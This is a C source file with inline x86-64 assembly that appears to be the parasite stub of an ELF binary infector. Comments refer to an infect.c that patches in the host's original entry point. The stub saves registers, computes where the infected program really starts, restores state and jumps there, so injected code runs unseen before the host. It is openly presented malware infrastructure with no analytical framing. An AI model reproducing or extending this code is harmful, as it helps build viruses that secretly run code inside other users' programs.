
/*
 * infect.c will patch these values
 * with the addrs of e_entry, and get_rip()
 * from before they are relocated at runtime.
 * These are then subtracted from eachother and
 * from the instruction pointer to get the correct
 * address to jump to.
 */
static unsigned long o_entry __attribute__((section(".data"))) = {0x00};
static unsigned long vaddr_of_get_rip __attribute__((section(".data"))) = {0x00};

unsigned long get_rip(void);

extern long get_rip_label;
extern long real_start;

#define __ASM__ asm volatile
/*
 * Code to jump back to entry point
 */
int volatile _start() {
	/*
	 * Save register state before executing parasite
	 * code.
	 */
	__ASM__ (
	".globl real_start\n"
	 "real_start:	\n"
	 "push %rsp	\n"
	 "push %rbp	\n"
	 "push %rax	\n"
	 "push %rbx	\n"
	 "push %rcx	\n"
	 "push %rdx	\n"
	 "push %r8	\n"
	 "push %r9	\n"
	 "push %r10	\n"
	 "push %r11	\n"
	 "push %r12	\n"
	 "push %r13	\n"
	 "push %r14	\n"
	 "push %r15	  ");

	unsigned long n_entry = get_rip() - (vaddr_of_get_rip - o_entry);

	  /*
	 * Restore register state
	 */
	__ASM__ (
	 "pop %r15	\n"
	 "pop %r14	\n"
	 "pop %r13	\n"
	 "pop %r12	\n"
	 "pop %r11	\n"
	 "pop %r10	\n"
	 "pop %r9	\n"
	 "pop %r8	\n"
	 "pop %rdx	\n"
	 "pop %rcx	\n"
	 "pop %rbx	\n"
	 "pop %rax	\n"
	 "pop %rbp	\n"
	 "pop %rsp	\n"
	);

	__asm__ volatile (
		"movq %0, %%rbx\n"
		"jmpq *%0" :: "g"(n_entry)
		);
}

unsigned long get_rip(void)
{
	long ret;
	__asm__ __volatile__
	(
	"call get_rip_label	\n"
	".globl get_rip_label	\n"
	"get_rip_label:		\n"
	"pop %%rax		\n"
	"mov %%rax, %0" : "=r"(ret)
	);

	return ret;
}
